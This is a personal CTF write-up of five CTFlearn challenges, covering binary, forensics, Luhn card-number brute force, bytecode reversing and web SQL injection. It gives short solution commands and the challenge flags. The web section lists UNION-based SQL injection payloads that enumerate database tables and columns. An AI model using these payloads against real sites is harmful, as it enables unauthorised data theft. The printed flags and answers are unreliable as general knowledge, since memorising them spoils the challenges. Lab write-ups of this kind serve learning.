# CTF题目 June. 23rd 2021

## [Medium] [Binary] Lazy Game Challenge

I found an interesting game made by some guy named "John_123". It is some betting game. I made some small fixes to the game; see if you can still pwn this and steal $1000000 from me!

To get flag, pwn the server at: `nc thekidofarcrania.com 10001`

```bash
-1000000
Current balance :  :
1000500$
What the... how did you get that money (even when I tried to stop you)!? I guess you beat me!

The flag is CTFlearn{d9029a08c55b936cbc9a30_i_wish_real_betting_games_were_like_this!}

Thank you for playing !
```



## [Medium] [Forensics] Tux!

The flag is hidden inside the Penguin!

https://ctflearn.com/challenge/download/973

```bash
strings Tux.jpg
ICAgICAgUGFzc3dvcmQ6IExpbnV4MTIzNDUK
Password: Linux12345
binwalk -e Tux.jpg
CTFlearn{Linux_Is_Awesome}
```



## [Medium] [Programming] The Credit Card Fraudster

I just arrested someone who is probably the most wanted credit card fraudster in Europe. She is a smart cybercriminal, always a step ahead INTERPOL and she kept unnoticed for years by never buying online, but buying goods with a different card every time and in different stores. My cyber-analysts found out after collecting all evidences she hacked into one the largest payment provider in Europe, reverse-engineered the software present on the server and partly corrupted the card number validation code to accept all her payments. The change enables acceptance of any transaction with a card number multiple of 123457 and the Luhn check digit is valid.

I caught her because every year she bought a bouquet of flowers next to the same cemetery. While handcuffing her at the flower shop's exit, she said the flowers were for her lost father and today it is his death anniversary. She broke down in tears and she did some steps and threw something in the sewers. My female colleague conducted a search on her, but she couldn't find the card she used, only the receipt.

```
The little flower shop
======================

European Express Debit
Card Number: 543210******1234
SALE

Please debit my account
Amount: 25.00€
```

Can you help me to recover the card number so that I can confirm with the flower merchant's bank the card number was used in that shop and is fraudulent?

*Hints:*

1/ [Luhn_algorithm](https://www.youtube.com/watch?v=PNXXqzU4YnM)

2/ Flag format is `CTFlearn{card_number}`

```bash
#!/bin/env/python3

prefix = "543210"
suffix = "1234"
mult = "123457"

# Returns true if given card
# number is valid
def checkLuhn(cardNo):
     
    nDigits = len(cardNo)
    nSum = 0
    isSecond = False
     
    for i in range(nDigits - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
     
        if (isSecond == True):
            d = d * 2
  
        # We add two digits to handle
        # cases that make two digits after
        # doubling
        nSum += d // 10
        nSum += d % 10
  
        isSecond = not isSecond
     
    if (nSum % 10 == 0):
        return True
    else:
        return False

def main():
    for i in range(1000000):
        guess = prefix + str(i).zfill(6) + suffix
        if checkLuhn(guess) and int(guess) % int(mult) == 0:
            print(guess)
            break

if __name__ == "__main__":
    main()

# Result: 5432103279251234
```



## [Medium] [Reverse Engineering] Bite-code

I dunno what bytecode is. Could you tell me what input of 'checkNum' will return true? The flag is just a 32-bit signed integer as a decimal (nothing else.)

https://mega.nz/#!qfATFaKR!zaTNExq3Bm1MjJnePjTGQyvnvLX_xZxhbGaMv_ypaxo

*Hints:*

1/ x64 Manual: https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

```bash
(x << 3) ^ (x ^ 0x1F4B3D56) == 0xCAFEBABE
(x << 3) ^ x == 0xD5B587E8
x == 65CB07E8
```



## [Hard] [Web] Inj3ction Time

I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command

*Hints:*

1/ How to find database name, table name, and column name?

```bash
id=1 order by 4 --
union select table_name,2,3,4 from information_schema.tables --
union select column_name,2,3,4 from information_schema.columns --
union select f0und_m3,2,3,4 from w0w_y0u_f0und_m3 --
abctf{uni0n_1s_4_gr34t_c0mm4nd}
```

